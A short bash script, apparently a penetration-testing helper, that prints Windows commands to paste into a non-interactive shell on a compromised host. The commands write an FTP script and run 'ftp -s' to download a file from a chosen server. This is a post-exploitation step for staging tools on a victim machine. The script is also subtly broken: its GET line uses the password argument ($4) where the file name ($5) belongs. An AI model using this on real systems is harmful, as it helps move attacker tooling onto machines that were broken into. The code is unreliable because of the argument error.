#!/bin/bash

function helper() {
  echo "[*] Simple windows ftp command generation"
  echo "[*] Usage: $0 <ip addr> <port> <username> <passwd> <file name>"
  echo "[*] Example:"
  echo -e "[*] \t$0 10.0.0.1 21 test 1234 hello.txt"
  echo "[*]"
  echo "[*] Copy/Past and GG WP"
  echo "[*] Into non interactive shell"
  echo ""
  exit 0
}

if [ -z $1 ] || [ -z $2 ] || [ -z $3 ] || [ -z $4 ] || [ -z $5 ]; then
  helper
fi

echo "[*] Simple windows ftp command generation"
echo "[*] Copy/Past and GG WP"
echo "[*] Into non interactive shell"

echo "
echo open $1 $2> ftp.txt
echo USER $3 >> ftp.txt
echo $4 >> ftp.txt
echo bin >> ftp.txt
echo GET $4 >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt"

echo "[*] Don't forget to hit enter one time after copy pasting!"